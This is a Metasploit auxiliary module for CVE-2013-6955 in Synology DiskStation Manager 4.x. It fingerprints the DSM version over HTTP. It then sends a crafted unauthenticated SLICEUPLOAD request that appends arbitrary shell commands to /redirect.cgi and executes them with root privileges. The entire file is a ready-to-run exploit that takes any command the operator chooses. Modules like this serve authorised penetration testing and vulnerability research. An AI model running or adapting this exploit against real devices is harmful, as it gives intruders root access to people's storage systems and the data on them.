##
## This module requires Metasploit: http//metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  DEVICE_INFO_PATTERN = /major=(?<major>\d+)&minor=(?<minor>\d+)&build=(?<build>\d+)
                        &junior=\d+&unique=synology_\w+_(?<model>[^&]+)/x

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Synology DiskStation Manager SLICEUPLOAD Unauthenticated Remote Command Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in Synology DiskStation Manager (DSM)
        versions 4.x, which allows the execution of arbitrary commands under root
        privileges.
        The vulnerability is located in /webman/imageSelector.cgi, which allows to append
        arbitrary data to a given file using a so called SLICEUPLOAD functionality, which
        can be triggered by an unauthenticated user with a specially crafted HTTP request.
        This is exploited by this module to append the given commands to /redirect.cgi,
        which is a regular shell script file, and can be invoked with another HTTP request.
        Synology reported that the vulnerability has been fixed with versions 4.0-2259,
        4.2-3243, and 4.3-3810 Update 1, respectively; the 4.1 branch remains vulnerable.
      },
      'Author'         =>
        [
          'Markus Wulftange' # Discovery, Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'Privileged'     => false,
      'DisclosureDate' => 'Oct 31 2013',
      'References'     =>
        [
          ['CVE', '2013-6955'],
        ]
    ))

    register_options(
      [
        Opt::RPORT(5000),
        OptString.new('CMD', [true, 'The shell command to execute'])
      ], self.class)
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def check
    print_status("#{peer} - Trying to detect installed version")

    res = send_request_cgi({
     'method' => 'GET',
     'uri'    => normalize_uri('/webman/info.cgi?host=')
    })

    if res and res.code == 200 and res.body =~ DEVICE_INFO_PATTERN
      version = "#{$~[:major]}.#{$~[:minor]}"
      build = $~[:build]
      model = $~[:model].sub(/^[a-z]+/) { |s| s[0].upcase }
      model = "DS#{model}" unless model =~ /^[A-Z]/
    else
      print_status("#{peer} - Detection failed")
      return Exploit::CheckCode::Unknown
    end

    print_status("#{peer} - Model #{model} with version #{version}-#{build} detected")

    case version
    when '4.0'
      return Exploit::CheckCode::Vulnerable if build < '2259'
    when '4.1'
      return Exploit::CheckCode::Vulnerable
    when '4.2'
      return Exploit::CheckCode::Vulnerable if build < '3243'
    when '4.3'
      return Exploit::CheckCode::Vulnerable if build < '3810'
      return Exploit::CheckCode::Detected if build == '3810'
    end

    Exploit::CheckCode::Safe
  end

  def run
    cmds = [
      # sed is used to restore the redirect.cgi
      "sed -i -e '/sed -i -e/,$d' /usr/syno/synoman/redirect.cgi",
      datastore['CMD']
    ].join("\n")

    mime_msg = Rex::MIME::Message.new
    mime_msg.add_part('login', nil, nil, 'form-data; name="source"')
    mime_msg.add_part('logo', nil, nil, 'form-data; name="type"')

    # unfortunately, Rex::MIME::Message canonicalizes line breaks to \r\n,
    # so we use a placeholder and replace it later
    cmd_placeholder = Rex::Text::rand_text_alphanumeric(10)
    mime_msg.add_part(cmd_placeholder, 'application/octet-stream', nil,
                      'form-data; name="foo"; filename="bar"')

    post_body = mime_msg.to_s
    post_body.strip!
    post_body.sub!(cmd_placeholder, cmds)

    # fix multipart encoding
    post_body.gsub!(/\r\n(--#{mime_msg.bound})/, '  \\1')

    # send request to append shell commands
    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => '/webman/imageSelector.cgi',
      'ctype'   => "multipart/form-data; boundary=#{mime_msg.bound}",
      'headers' => {
        'X-TYPE-NAME' => 'SLICEUPLOAD',
        'X-TMP-FILE'  => '/usr/syno/synoman/redirect.cgi'
      },
      'data'    => post_body
    })

    unless res and res.code == 200 and res.body.include?('error_noprivilege')
      print_error("#{peer} - Unexpected response, probably the exploit failed")
      return
    end

    # send request to invoke the injected shell commands
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => '/redirect.cgi'
    })

    unless res and res.code == 200
      print_error("#{peer} - Unexpected response, probably the exploit failed")
      return
    end

    print_good("#{peer} - Command successfully executed")
    print_line(res.body)
  end
end

